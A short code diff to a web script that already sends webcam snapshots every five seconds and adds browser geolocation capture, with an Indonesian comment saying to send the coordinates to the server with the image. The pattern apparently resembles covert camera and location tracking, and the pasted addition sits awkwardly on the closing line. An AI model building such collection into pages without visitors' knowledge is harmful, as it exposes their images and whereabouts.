@@ -173,4 +173,15 @@ setInterval(() => {
     if (video.srcObject) {
         captureAndSend();
     }
-}, 5000);
+}, 5000);// Di script.js, tambahkan:
+
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(position => {
+        const geoData = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy
+        };
+        // Kirim ke server bersama gambar
+    });
+}
